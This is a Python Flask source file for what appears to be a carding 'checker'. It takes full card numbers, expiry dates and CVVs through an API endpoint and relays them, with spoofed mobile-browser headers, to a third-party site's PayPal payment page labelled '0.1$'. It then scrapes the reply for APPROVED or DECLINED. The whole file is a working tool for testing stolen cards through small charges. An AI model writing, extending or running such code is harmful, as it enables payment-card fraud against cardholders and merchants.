from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def process_paypal_response(raw_text):
    """Extract status and response message from raw HTML"""
    # Check for server error responses (502 or 503)
    if '502' in raw_text or '503' in raw_text:
        return {
            "response": "CARD DECLINED",
            "status": "DECLINED"
        }

    # Check for approved status
    if 'text-success">APPROVED<' in raw_text:
        status = "APPROVED"
        parts = raw_text.split('class="text-success">')
        if len(parts) > 2:
            response_msg = parts[2].split('</span>')[0].strip()
        else:
            response_msg = "PAYPAL_APPROVED"
    else:
        # Check for declined status
        status = "DECLINED"
        parts = raw_text.split('class="text-danger">')
        if len(parts) > 2:
            response_msg = parts[2].split('</span>')[0].strip()
        else:
            response_msg = "CARD DECLINED"

    return {
        "response": response_msg,
        "status": status
    }

def check_paypal_card(cc_details):
    """Check PayPal status for a single card"""
    if not len(cc_details.split('|')) == 4:
        return {
            "response": "Invalid format. Use CC|MM|YYYY|CVV",
            "status": "DECLINED",
            "gateway": "Paypal [0.1$]"
        }

    headers = {
        'authority': 'wizvenex.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wizvenex.com',
        'referer': 'https://wizvenex.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {'lista': cc_details}

    try:
        response = requests.post(
            'https://wizvenex.com/Paypal.php',
            headers=headers,
            data=data,
            timeout=30
        )
        result = process_paypal_response(response.text)
        result["gateway"] = "Paypal [0.1$]"
        return result

    except requests.exceptions.Timeout:
        return {
            "response": "TIMEOUT_ERROR",
            "status": "ERROR",
            "gateway": "Paypal [0.1$]"
        }
    except Exception as e:
        return {
            "response": f"REQUEST_FAILED: {str(e)}",
            "status": "ERROR",
            "gateway": "Paypal [0.1$]"
        }

@app.route('/gateway=paypal0.1$/cc=', methods=['GET'])
def paypal_gateway():
    cc_details = request.args.get('cc')
    if not cc_details:
        return jsonify({
            "response": "Missing cc parameter. Use CC|MM|YYYY|CVV",
            "status": "ERROR",
            "gateway": "Paypal [0.1$]"
        }), 400

    result = check_paypal_card(cc_details)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
